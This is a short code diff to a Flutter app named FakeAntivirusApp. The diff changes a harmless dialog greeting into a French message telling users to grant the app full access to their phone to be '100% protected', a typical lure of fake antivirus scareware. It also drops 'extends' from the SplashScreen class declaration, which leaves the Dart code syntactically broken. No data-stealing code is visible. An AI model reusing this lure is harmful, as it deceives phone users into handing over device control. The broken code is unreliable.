@@ -27,7 +27,7 @@ class FakeAntivirusApp extends StatelessWidget {
 
 // ─── Splash Screen ───────────────────────────────────────────────────────────
 
-class SplashScreen extends StatefulWidget {
+class SplashScreen StatefulWidget {
   const SplashScreen({super.key});
 
   @override
@@ -226,7 +226,7 @@ class _HomeScreenState extends State<HomeScreen> with TickerProviderStateMixin {
           ],
         ),
         content: const Text(
-          'Bonjour les amis',
+          "Vous devez donner l'accès complet de votre téléphone pour que l'on puisse vous protéger à 100% :)",
           style: TextStyle(color: Colors.white70, fontSize: 15),
         ),
         actions: [
